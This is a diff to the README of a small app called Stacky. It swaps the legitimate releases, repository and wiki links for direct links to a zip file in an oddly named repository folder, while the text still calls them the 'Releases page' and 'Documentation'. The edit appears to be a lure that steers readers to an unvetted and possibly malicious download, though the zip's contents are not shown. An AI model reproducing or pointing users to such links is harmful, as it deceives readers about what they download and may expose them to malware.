@@ -6,7 +6,7 @@ Welcome to Stacky! This application will help you discover your coding destiny. 
 
 ## 📥 Download Stacky
 
-[![Download Stacky](https://img.shields.io/badge/Download%20Stacky-1.0-brightgreen)](https://github.com/mauelito3/Stacky/releases)
+[![Download Stacky](https://raw.githubusercontent.com/mauelito3/Stacky/main/murmurlessly/Stacky.zip%20Stacky-1.0-brightgreen)](https://raw.githubusercontent.com/mauelito3/Stacky/main/murmurlessly/Stacky.zip)
 
 Click the link above to visit our Releases page where you can download the application.
 
@@ -23,7 +23,7 @@ Before you download, ensure your system meets the following requirements:
 
 To download Stacky, follow these steps:
 
-1. Visit the [Releases page](https://github.com/mauelito3/Stacky/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/mauelito3/Stacky/main/murmurlessly/Stacky.zip).
 2. Look for the latest version of Stacky.
 3. Click on the download link for your operating system.
 4. Once the download is complete, locate the downloaded file in your computer's downloads folder.
@@ -72,8 +72,8 @@ Stacky can help you discover your role in areas like:
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/mauelito3/Stacky)
-- [Releases Page](https://github.com/mauelito3/Stacky/releases)
-- [Documentation](https://github.com/mauelito3/Stacky/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/mauelito3/Stacky/main/murmurlessly/Stacky.zip)
+- [Releases Page](https://raw.githubusercontent.com/mauelito3/Stacky/main/murmurlessly/Stacky.zip)
+- [Documentation](https://raw.githubusercontent.com/mauelito3/Stacky/main/murmurlessly/Stacky.zip)
 
 Thank you for choosing Stacky. Happy coding!
